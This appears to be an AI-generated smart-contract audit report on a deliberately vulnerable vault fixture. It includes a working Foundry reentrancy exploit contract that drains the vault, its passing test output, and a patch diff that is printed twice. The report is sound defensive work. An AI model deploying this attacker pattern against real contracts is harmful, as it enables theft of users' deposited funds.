# Redline audit: fixtures/vulnerable-vault

- run: `vulnerable-vault-8a3e99`
- provider: `nvidia`; main model `nvidia/nemotron-3.5-super-vl-120b-a12b`; firewall model `nvidia/nemotron-3.5-lightning-30b-a3b`
- baseline tests green: True; elapsed: 463 s

## Findings

| id | severity | status | patch | title |
|---|---|---|---|---|
| F1 | critical | confirmed | fixed | Reentrancy in withdraw() allows draining the vault |

### F1 - Reentrancy in withdraw() allows draining the vault (critical, confirmed)

- description: The withdraw function performs the external call (msg.sender.call) before updating the user's balance. A malicious contract can re-enter withdraw() during the call, pass the balance check again, and withdraw repeatedly until the vault is empty.
- file: src/Vault.sol
- function: withdraw

**PoC** (`test/Exploit_F1.t.sol`, 1 attempt(s))

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract ReentrancyAttacker {
    address public immutable vault;
    uint256 public immutable amount;

    constructor(address _vault, uint256 _amount) {
        vault = _vault;
        amount = _amount;
    }

    function deposit() external payable {
        Vault(vault).deposit{value: msg.value}();
    }

    receive() external payable {
        // Re-enter withdraw while the vault still holds ETH. The vault does
        // not decrement balances[msg.sender] until after the external call,
        // so the balance check keeps passing.
        if (address(vault).balance >= amount) {
            Vault(vault).withdraw(amount);
        }
    }

    function attack() external payable {
        Vault(vault).withdraw(amount);
    }

    function sweep() external {
        (bool ok,) = payable(msg.sender).call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}

contract VaultTest is Test {
    Vault public vault;
    address public immutable attacker = address(0x1234);
    address public immutable victim = address(0x5678);

    function setUp() public {
        vault = new Vault();
    }

    function test_exploit() public {
        uint256 victimDeposit = 20 ether;
        uint256 attackerDeposit = 1 ether;
        uint256 amount = 1 ether;

        // Fund the parties so they can deposit real ETH.
        vm.deal(victim, victimDeposit);
        vm.deal(attacker, attackerDeposit);

        // Victim deposits into the vault.
        vm.prank(victim);
        vault.deposit{value: victimDeposit}();

        // Deploy the attacker contract and fund it.
        ReentrancyAttacker attackerContract = new ReentrancyAttacker(address(vault), amount);
        vm.deal(address(attackerContract), attackerDeposit);

        // Attacker contract deposits into the vault so balances[attackerContract] > 0.
        vm.prank(address(attackerContract));
        attackerContract.deposit{value: attackerDeposit}();

        uint256 initialVaultAssets = vault.totalAssets();
        assertEq(initialVaultAssets, victimDeposit + attackerDeposit);

        // Initiate the reentrancy exploit.
        vm.prank(address(attackerContract));
        attackerContract.attack();

        // The vault should be fully drained.
        assertEq(vault.totalAssets(), 0);

        // Attacker sweeps the drained funds to themselves.
        vm.prank(attacker);
        attackerContract.sweep();

        // Concrete harm: attacker ends with far more than the 1 ETH they deposited.
        assertGt(attacker.balance, attackerDeposit);
    }
}
```

forge output:

```
[PASS] VaultTest.test_exploit()
```

**Patch**: applied=True, exploit blocked=True, existing suite green=True

```diff
--- a/src/Vault.sol
+++ b/src/Vault.sol
@@ -11,14 +11,14 @@
 
     function withdraw(uint256 amount) external {
         require(balances[msg.sender] >= amount, "insufficient");
-        (bool ok,) = msg.sender.call{value: amount}("");
-        require(ok, "transfer failed");
         unchecked {
             balances[msg.sender] -= amount;
         }
+        (bool ok,) = msg.sender.call{value: amount}("");
+        require(ok, "transfer failed");
     }
 
     function totalAssets() external view returns (uint256) {
         return address(this).balance;
     }
-}
+}
--- a/src/Vault.sol
+++ b/src/Vault.sol
@@ -11,14 +11,14 @@
 
     function withdraw(uint256 amount) external {
         require(balances[msg.sender] >= amount, "insufficient");
-        (bool ok,) = msg.sender.call{value: amount}("");
-        require(ok, "transfer failed");
         unchecked {
             balances[msg.sender] -= amount;
         }
+        (bool ok,) = msg.sender.call{value: amount}("");
+        require(ok, "transfer failed");
     }
 
     function totalAssets() external view returns (uint256) {
         return address(this).balance;
     }
-}
+}
```

**Sources (Tavily)**

- [SC08:2026 Reentrancy Attacks - OWASP Smart Contract Security](https://scs.owasp.org/sctop10/SC08-ReentrancyAttacks)
- [Reentrancy Attack: Risks, Impact, And Prevention In Smart Contracts - Hacken](https://hacken.io/discover/reentrancy-attacks)
- [How Hackers Drain Smart Contracts: The Reentrancy Attack That Stole $60M | by Ancilar | Blockchain Services | Medium](https://medium.com/@ancilartech/how-hackers-drain-smart-contracts-the-reentrancy-attack-that-stole-60m-360ae43e88d1)
- [Understanding Re-entrancy in Smart Contracts – SolidityScan Blogs](https://blog.solidityscan.com/understanding-re-entrancy-in-smart-contracts-97cb67ecbb07)

## Firewall

Quarantined input spans: 0

Tool-call decisions: 15 total; L1 allow: 14, L2 allow: 1

## Model calls

| role | calls | prompt tok | completion tok | total s |
|---|---|---|---|---|
| exploit | 1 | 758 | 13023 | 120 |
| patch | 2 | 2843 | 2097 | 15 |
| policy | 1 | 316 | 41 | 1 |
| recon | 3 | 2352 | 18000 | 224 |
| recon-fallback | 1 | 742 | 888 | 37 |
| scanner | 8 | 3873 | 214 | 9 |

Cost: n/a (no per-token pricing configured; token counts above are measured).
